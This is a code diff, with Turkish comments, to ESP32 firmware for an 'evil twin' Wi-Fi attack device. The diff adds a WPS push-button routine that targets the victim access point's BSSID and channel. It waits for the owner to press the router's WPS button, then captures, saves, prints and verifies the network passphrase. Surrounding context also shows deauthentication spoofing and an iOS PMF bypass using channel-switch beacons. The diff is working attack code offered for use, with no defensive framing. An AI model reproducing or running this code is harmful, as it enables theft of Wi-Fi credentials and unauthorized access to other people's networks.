@@ -1,5 +1,6 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_wps.h>
 #include <DNSServer.h>
 #include "evil_twin.h"
 #include "definitions.h"
@@ -13,6 +14,11 @@ String  evil_twin_ssid    = "";
 int     evil_twin_clients = 0;
 int     evil_twin_channel = 1;
 uint8_t evil_twin_bssid[6] = {0};
+
+// ─── WPS PBC durum değişkenleri ───────────────────────────────────────────────
+bool et_wps_pbc_running  = false;
+bool et_wps_pbc_found    = false;
+char et_wps_pbc_pass[65] = {0};
 
 // ─── İç değişkenler ───────────────────────────────────────────────────────────
 static DNSServer dns_server;
@@ -29,6 +35,121 @@ static uint8_t       et_last_client[6] = {0};  // Son görülen hedef cihaz MAC
 
 // ─── Bağımlılıklar ────────────────────────────────────────────────────────────
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+
+// ─── WPS PBC Olay İşleyici ────────────────────────────────────────────────────
+// Kullanıcı modemdeki WPS tuşuna bastığında modem PBC yayınlar;
+// ESP32 STA arayüzü bu handshake'i yakalayarak şifreyi alır.
+static bool et_wps_handler_registered = false;
+static volatile int8_t et_wps_evt = 0;  // 0=bekliyor, 1=başarı, -1=hata/timeout
+static unsigned long et_wps_started_ms = 0;
+#define ET_WPS_PBC_TIMEOUT_MS  120000UL  // 2 dakika — kullanıcı tuşa basacak
+
+static void et_wps_event_cb(void *arg, esp_event_base_t base,
+                             int32_t id, void *data) {
+  if (base != WIFI_EVENT) return;
+  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
+    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
+    if (e && e->ap_cred_cnt > 0) {
+      strncpy(et_wps_pbc_pass, (char *)e->ap_cred[0].passphrase, 64);
+      et_wps_pbc_pass[64] = '\0';
+    }
+    et_wps_evt = 1;
+  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
+             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
+    et_wps_evt = -1;
+  }
+}
+
+// ─── WPS PBC Başlat ──────────────────────────────────────────────────────────
+// APSTA modunda STA arayüzü üzerinden WPS Push Button Config başlatır.
+// AP + DNS kesintisiz çalışmaya devam eder.
+void et_start_wps_pbc() {
+  if (et_wps_pbc_running) return;
+
+  et_wps_pbc_found   = false;
+  et_wps_pbc_pass[0] = '\0';
+  et_wps_evt         = 0;
+  et_wps_started_ms  = millis();
+  et_wps_pbc_running = true;
+
+  // Sniferi durdur — STA arayüzünü WPS için serbest bırak
+  esp_wifi_set_promiscuous(false);
+
+  // Olay işleyiciyi kaydet (bir kez)
+  if (!et_wps_handler_registered) {
+    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
+                               &et_wps_event_cb, nullptr);
+    et_wps_handler_registered = true;
+  }
+
+  // STA'yı hedef AP'ye yönlendir — BSSID ve kanal sabitle
+  wifi_config_t sta_cfg = {};
+  snprintf((char *)sta_cfg.sta.ssid, sizeof(sta_cfg.sta.ssid),
+           "%s", evil_twin_ssid.c_str());
+  sta_cfg.sta.bssid_set = 1;
+  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
+  sta_cfg.sta.channel   = (uint8_t)evil_twin_channel;
+  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
+
+  // WPS PBC modunu etkinleştir ve başlat
+  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+  esp_wifi_wps_enable(&cfg);
+  esp_wifi_wps_start(0);
+
+  DEBUG_PRINTLN("ET WPS PBC: baslatildi — kullanici modemi WPS tusuna bassın");
+}
+
+// ─── WPS PBC Durdur ───────────────────────────────────────────────────────────
+void et_stop_wps_pbc() {
+  if (!et_wps_pbc_running) return;
+  et_wps_pbc_running = false;
+  et_wps_evt         = 0;
+  esp_wifi_wps_disable();
+  DEBUG_PRINTLN("ET WPS PBC: durduruldu");
+}
+
+// ─── WPS PBC Döngüsü (evil_twin_loop içinden çağrılır) ───────────────────────
+static void et_wps_pbc_loop() {
+  if (!et_wps_pbc_running) return;
+
+  if (et_wps_evt == 1) {
+    // Başarı — şifre yakalandı
+    et_wps_pbc_running = false;
+    et_wps_pbc_found   = true;
+    esp_wifi_wps_disable();
+
+    String pw = String(et_wps_pbc_pass);
+    if (pw.length() > 0) {
+      passwords_save(evil_twin_ssid, pw);
+      DEBUG_PRINT("ET WPS PBC basarili! Sifre: ");
+      DEBUG_PRINTLN(pw);
+      // Şifreyi gerçek AP'de doğrula (arka planda, AP çalışmaya devam eder)
+      evil_twin_test_password(pw);
+    }
+
+  } else if (et_wps_evt == -1) {
+    // Hata veya timeout — 5 saniye sonra yeniden dene
+    DEBUG_PRINTLN("ET WPS PBC: hata, 5s sonra yeniden denenecek");
+    et_wps_evt = 0;
+    esp_wifi_wps_disable();
+    delay(5000);
+    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+    esp_wifi_wps_enable(&cfg);
+    esp_wifi_wps_start(0);
+    et_wps_started_ms = millis();
+
+  } else if (millis() - et_wps_started_ms > ET_WPS_PBC_TIMEOUT_MS) {
+    // 2 dakika geçti — yeniden başlat
+    DEBUG_PRINTLN("ET WPS PBC: zaman asimi, yeniden baslaniyor");
+    et_wps_evt = 0;
+    esp_wifi_wps_disable();
+    delay(1000);
+    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+    esp_wifi_wps_enable(&cfg);
+    esp_wifi_wps_start(0);
+    et_wps_started_ms = millis();
+  }
+}
 
 // ─── Evil Twin Sniffer — iOS/Android/Windows/eski cihaz tam uyumluluk ─────────
 // AP→Station (4 reason kodu) + Station→AP spoof (bidirectional) + Broadcast
@@ -367,6 +488,9 @@ void evil_twin_loop() {
   dns_server.processNextRequest();
   evil_twin_clients = WiFi.softAPgetStationNum();
 
+  // WPS PBC arka plan kontrolü — önce çalıştır, kritik yol
+  et_wps_pbc_loop();
+
   unsigned long now = millis();
 
   // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
@@ -414,6 +538,13 @@ void stop_evil_twin() {
   et_led_state      = false;
   memset(et_last_client, 0, 6);  // Hedef MAC sıfırla
   led_off();
+
+  // WPS PBC varsa durdur
+  if (et_wps_pbc_running) {
+    et_wps_pbc_running = false;
+    et_wps_evt         = 0;
+    esp_wifi_wps_disable();
+  }
 
   esp_wifi_set_promiscuous(false);
   dns_server.stop();
